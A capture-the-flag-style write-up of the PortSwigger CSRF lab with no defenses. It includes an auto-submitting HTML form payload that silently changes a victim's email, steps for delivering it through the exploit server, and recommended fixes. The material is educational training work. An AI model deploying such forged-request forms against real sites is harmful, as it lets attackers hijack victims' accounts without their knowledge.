## Lab Title: CSRF vulnerability with no defenses  

- **Category:** Cross-Site Request Forgery  
- **Level:** Apprentice  
- **Platform:** PortSwigger Web Security Academy  

## Overview  
This lab demonstrates a basic CSRF vulnerability where the email change functionality has no defenses. Attackers can forge requests on behalf of a victim without restrictions.  

## Vulnerability Context  
- **Entry Point:** Change email form.  
- **Impact:** Unauthorized state-changing requests.  
- **Security Weakness:** No CSRF tokens, SameSite cookies, or referer/origin checks.  

## Exploit Technique  
Attackers can craft a malicious HTML form that auto-submits when a victim visits the attacker’s page.  

---

**Figure 1: Generating an automated CSRF Proof of Concept (PoC) exploit form utilizing Burp Suite Professional's built-in tool.**

<img width="577" height="561" alt="image" src="https://github.com/user-attachments/assets/1b2083f9-fe39-478e-9578-9a7146bedaa0" />

---

### Example Payload  
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="hacker@evil-user.net">
</form>
<script>
  document.forms[0].submit();
</script>
```

---

**Figure 2: Deploying a custom CSRF HTML payload on the exploit server targeting the account email-change functionality.**

<img width="1009" height="523" alt="image" src="https://github.com/user-attachments/assets/f872b2e9-d132-4661-a2ce-56719d821988" />

- The form mimics the legitimate email change request.
- vWhen the victim loads the attacker’s page, the form auto-submits.
- The victim’s email address is changed without their knowledge.

---

**Figure 3: Configuring the finalized CSRF exploit body payload with the target parameter set to alter the victim's account email address.**

<img width="1015" height="527" alt="image" src="https://github.com/user-attachments/assets/a77c3127-6b15-479c-a251-61376e766341" />

---

**Figure 4: Verifying successful CSRF exploitation via the account profile page, confirming the unauthorized email modification.**

<img width="1156" height="407" alt="WhatsApp Image 2026-07-08 at 15 51 35" src="https://github.com/user-attachments/assets/3ca49747-eacf-4cdf-9195-2417f04512a6" />

## Verification

- Store the exploit on the exploit server.
- Click “View exploit” to test it on your own account.
- Confirm the email address changes.
- Deliver the exploit to the victim to solve the lab.

---

**Figure 5: Verifying the execution of the final CSRF attack string on the exploit server, confirming completion of the lab challenge.**

<img width="1167" height="540" alt="image" src="https://github.com/user-attachments/assets/30a2a2ca-a125-432c-8264-1c94038a047e" />

## Security Impact

- Account Manipulation: Victim’s account details can be altered.
- Privilege Abuse: Attackers can escalate control over victim accounts.
- High Severity: Any authenticated action can be hijacked.

## Recommended Fixes

- Implement CSRF tokens validated server-side.
- Use SameSite cookies to prevent cross-origin submission.
- Validate Origin and Referer headers.

## Lessons Learned
This lab highlights the importance of CSRF defenses. Without them, any authenticated action can be hijacked by attackers, making even simple forms dangerous.
